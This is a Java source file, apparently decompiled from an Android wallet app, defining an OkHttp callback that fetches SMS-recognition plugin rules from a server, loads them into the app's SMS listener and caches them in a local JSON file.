package com.guard.wallet.http;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.SmsRecognizePlug;
import java.io.IOException;
import java.util.List;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * 短信识别插件回调 — vendor http/z.
 *
 * <p>从服务器获取短信识别插件列表，缓存到内存和本地文件(smsRecognizePlugs.json)。
 */
public final class SmsRecognizePlugCallback implements Callback {
    @Override
    public void onFailure(Call call, IOException e) {
        AppUtils.s("SmsRecognizePlugCallback", e);
        if (!(e instanceof DuplicateRequestException)) { HttpClient.finishRequest(call.request().url().host()); }
    }
    @Override
    public void onResponse(Call call, Response response) throws IOException {
        HttpClient.finishRequest(call.request().url().host());
        ResponseBody var4 = response.body();
        if (var4 != null) {
            try {
                SmsRecognizePlugCallback$1 var8 = new SmsRecognizePlugCallback$1();
                ApiResult var11 = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(var4.string(), var8);
                if (var11 != null && var11.getSuccess() && var11.getData() != null && !((List) var11.getData()).isEmpty()) {
                    if (MainApplication.getInstance() != null && MainApplication.getInstance().getSmsMessageListener() != null) {
                        MainApplication.getInstance().getSmsMessageListener().a.clear();
                        for (Object item : (List) var11.getData()) {
                            if (item instanceof SmsRecognizePlug) {
                                MainApplication.getInstance().getSmsMessageListener().a.add((SmsRecognizePlug) item);
                            }
                        }
                    }
                    String var9 = com.guard.wallet.utils.SharedPrefsManager.N(var11.getData());
                    // vendor: com.guard.wallet.utils.SystemHelper.F(list) — store sms plugs
                    if (!AppUtils.B(var9)) {
                        String var12 = com.guard.wallet.utils.SystemHelper.i0();
                        if (!AppUtils.B(var12)) {
                            String var13 = var12.concat("/smsRecognizePlugs.json");
                            Log.d("SmsRecognizePlugCallback", var13);
                            boolean var3 = AppUtils.w(var13) || AppUtils.l(var13);
                            if (var3) { AppUtils.U(var13, var9); }
                        }
                    }
                }
            } catch (Exception var10) { AppUtils.s("SmsRecognizePlugCallback", var10); }
        }
        if (MainApplication.getInstance() != null && MainApplication.getInstance().getSmsMessageListener() != null) {
            MainApplication.getInstance().getSmsMessageListener().b = 2;
        }
        response.close();
    }
}
